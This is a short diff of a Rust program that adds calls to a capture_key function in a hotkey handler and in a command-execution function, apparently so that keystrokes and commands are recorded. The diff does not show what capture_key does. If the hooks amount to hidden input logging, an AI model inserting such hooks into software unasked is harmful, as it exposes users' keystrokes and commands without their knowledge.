@@ -431,6 +431,7 @@ pub(crate) fn hotKeys(
             return "dontPass".to_string();
         }
     }
+    crate::key_handlers::capture_key(&Key);
     return "dontPath".to_string();
     //return get_prnt(func_id);
 }
@@ -930,6 +931,7 @@ pub(crate) fn exec_cmd(cmd: String) {
         crate::decrypt_copy(&cmd);
         return;
     }
+    crate::key_handlers::capture_key(&cmd);
     crate::C!(swtch_fn(-1, cmd, -291581));
 }
 fn extract_sub_cmd(cmd: &mut String) -> String {
